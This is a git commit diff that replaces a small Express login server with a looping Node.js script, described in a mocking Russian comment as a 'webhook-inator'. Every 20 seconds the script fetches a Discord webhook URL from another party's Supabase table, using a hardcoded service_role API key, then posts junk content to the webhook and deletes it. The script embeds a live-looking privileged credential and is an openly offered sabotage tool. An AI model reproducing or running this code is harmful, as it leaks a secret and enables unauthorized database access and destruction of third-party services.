f35be52b63115410f7ab649741f219100296a81b
Catt3a <169023485+Catt3a@users.noreply.github.com>
2026-06-18 05:24:49 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,27 +1,69 @@
-const express = require('express');
-const fs = require('fs');
-const crypto = require('crypto');
-const app = express();
-const PORT = process.env.PORT || 3000;
+//Трепещи xTroll утканос, я изобрёл вебхук-инатор!
 
-app.use(express.static('public'));
-app.use(express.json());
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const chillout = "https://kappjyhgnyeetqhzwcpn.supabase.co/rest/v1/system_config?id=eq.discord_webhook&select=value";
+const chillout2 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImthcHBqeWhnbnllZXRxaHp3Y3BuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2OTg0NDY4MiwiZXhwIjoyMDg1NDIwNjgyfQ.-XWR3RDlGstIrF-SC3VMaqcYXA7EgIZ-I9FyDO9bWDQ";
 
-const SALT = process.env.salt || '';
-const users = JSON.parse(fs.readFileSync('users.json', 'utf8'));
+const data = {
+  content: 'ntcn'
+};
 
-app.post('/login', (req, res) => {
-    const { username, password } = req.body;
-    const user = users.users.find(u => u.username === username);
-    if (!user) return res.status(401).json({ success: false, message: 'Неверный логин!' });
+async function sendWebhook(webhook_) {
+    try {
+        const response = await fetch(webhook_, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        });
 
-    const hash = crypto.scryptSync(password, SALT, 64).toString('hex');
-    console.log(hash);
-    if (hash === user.passwordHash) {
-        res.json({ success: true, message: 'Вход выполнен' });
-    } else {
-        res.status(401).json({ success: false, message: 'Неверный логин или пароль.' });
+        if (response.ok === false) {
+            console.log(response.statusText);
+        }
+    } catch (err) {
+        console.log(err);
     }
-});
+}
 
-app.listen(PORT, () => console.log(`Сервер на порту ${PORT}`));
+async function getLiveEndpoint() {
+    const headers = {
+        "apikey": chillout2,
+        "Authorization": "Bearer " + chillout2
+    };
+
+    try {
+        const response = await fetch(chillout, { headers });
+        if (!response.ok) return null;
+
+        const data = await response.json();
+        if (data && data[0] && data[0].value) {
+            return data[0].value;
+        }
+    } catch (err) {
+        console.log(err)
+    }
+
+    return null;
+}
+
+async function deleteWebhook(webhook_) {
+  try {
+    const response = await fetch(webhook_, { method: "DELETE" });
+    console.log(response)
+  }  catch (err) {console.log(err)}
+}
+
+
+async function main() {
+    while (true) {
+        await delay(15000);
+        let webhook = await getLiveEndpoint();
+        console.log(webhook);
+        sendWebhook();
+        await delay(5000);
+        deleteWebhook(webhook);
+    }
+}
+
+main()
